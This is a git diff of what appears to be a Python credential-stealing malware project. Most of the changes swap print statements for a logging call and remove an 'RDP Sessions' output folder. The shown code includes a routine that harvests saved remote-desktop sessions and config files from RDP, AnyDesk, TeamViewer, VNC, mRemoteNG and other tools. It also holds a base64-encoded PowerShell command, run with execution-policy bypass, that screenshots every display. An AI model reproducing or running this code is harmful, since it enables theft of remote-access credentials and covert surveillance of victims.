@@ -2120,6 +2120,7 @@ asyncio.run(main())
 
 
     async def StealRdpSessions(self, directory_path) -> None:
+
         paths_dict = {
             "Microsoft RDP": r"Software\Microsoft\Terminal Server Client\Servers",
             "Remote Desktop Manager": os.path.join(os.getenv("APPDATA"), "Devolutions", "RemoteDesktopManager"),
@@ -2150,7 +2151,7 @@ asyncio.run(main())
                     with open(os.path.join(app_path, f"{server_name}_session.txt"), "w") as f:
                         f.write(f"Server: {server_name}\nUsername: {username}")
             except Exception as e:
-                print(f"[ERROR] Microsoft RDP: {e}")
+                logs_handler(f"[ERROR] Microsoft RDP: {e}")
 
             try:
                 app_path = os.path.join(rdp_sessions_path, "Remote Desktop Manager")
@@ -2163,7 +2164,7 @@ asyncio.run(main())
                             with open(os.path.join(app_path, file), "w") as save_file:
                                 save_file.write(data)
             except Exception as e:
-                print(f"[ERROR] Remote Desktop Manager: {e}")
+                logs_handler(f"[ERROR] Remote Desktop Manager: {e}")
 
             try:
                 app_path = os.path.join(rdp_sessions_path, "mRemoteNG")
@@ -2176,7 +2177,7 @@ asyncio.run(main())
                     with open(os.path.join(app_path, f"{name}_session.xml"), "w") as f:
                         f.write(ET.tostring(connection, encoding="unicode"))
             except Exception as e:
-                print(f"[ERROR] mRemoteNG: {e}")
+                logs_handler(f"[ERROR] mRemoteNG: {e}")
 
             try:
                 app_path = os.path.join(rdp_sessions_path, "AnyDesk")
@@ -2189,7 +2190,7 @@ asyncio.run(main())
                             with open(os.path.join(app_path, file), "w") as save_file:
                                 save_file.write(data)
             except Exception as e:
-                print(f"[ERROR] AnyDesk: {e}")
+                logs_handler(f"[ERROR] AnyDesk: {e}")
 
             try:
                 app_path = os.path.join(rdp_sessions_path, "TeamViewer")
@@ -2202,7 +2203,7 @@ asyncio.run(main())
                             with open(os.path.join(app_path, file), "w") as save_file:
                                 save_file.write(data)
             except Exception as e:
-                print(f"[ERROR] TeamViewer: {e}")
+                logs_handler(f"[ERROR] TeamViewer: {e}")
 
             try:
                 app_path = os.path.join(rdp_sessions_path, "VNC Clients")
@@ -2216,7 +2217,7 @@ asyncio.run(main())
                                 with open(os.path.join(app_path, file), "w") as save_file:
                                     save_file.write(data)
             except Exception as e:
-                print(f"[ERROR] VNC Clients: {e}")
+                logs_handler(f"[ERROR] VNC Clients: {e}")
 
             try:
                 app_path = os.path.join(rdp_sessions_path, "Parallels Access")
@@ -2229,7 +2230,7 @@ asyncio.run(main())
                             with open(os.path.join(app_path, file), "w") as save_file:
                                 json.dump(data, save_file)
             except Exception as e:
-                print(f"[ERROR] Parallels Access: {e}")
+                logs_handler(f"[ERROR] Parallels Access: {e}")
 
             try:
                 app_path = os.path.join(rdp_sessions_path, "Chrome Remote Desktop")
@@ -2243,10 +2244,10 @@ asyncio.run(main())
                                 with open(os.path.join(app_path, file), "w") as save_file:
                                     save_file.write(data)
             except Exception as e:
-                print(f"[ERROR] Chrome Remote Desktop: {e}")
+                logs_handler(f"[ERROR] Chrome Remote Desktop: {e}")
 
         except Exception as e:
-            print(f"[ERROR] General Exception: {e}")
+            logs_handler(f"[ERROR] General Exception: {e}")
 
 
 
@@ -2693,7 +2694,6 @@ asyncio.run(main())
             os.makedirs(os.path.join(filePath, "Computer"), exist_ok=True)
             os.makedirs(os.path.join(filePath, "Sessions"), exist_ok=True)
             os.makedirs(os.path.join(filePath, "Games"), exist_ok=True)
-            os.makedirs(os.path.join(filePath, "RDP Sessions"), exist_ok=True)
 
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}", cwd=filePath, shell=True)
@@ -2802,11 +2802,6 @@ asyncio.run(main())
                     for value in ListFonction.MinecraftAccount:
                         file.write(value)
 
-            if ListFonction.RdpSession:
-                with open(os.path.join(filePath, "RDP Sessions", "sessions_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    for value in ListFonction.RdpSession:
-                        file.write(value)
-
 
             if len(os.listdir(os.path.join(filePath, "Mozilla"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Mozilla"))
@@ -2818,10 +2813,6 @@ asyncio.run(main())
 
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Sessions"))
-                except:pass
-
-            if len(os.listdir(os.path.join(filePath, "RDP Sessions"))) == 0:
-                try:shutil.rmtree(os.path.join(filePath, "RDP Sessions"))
                 except:pass
             
 
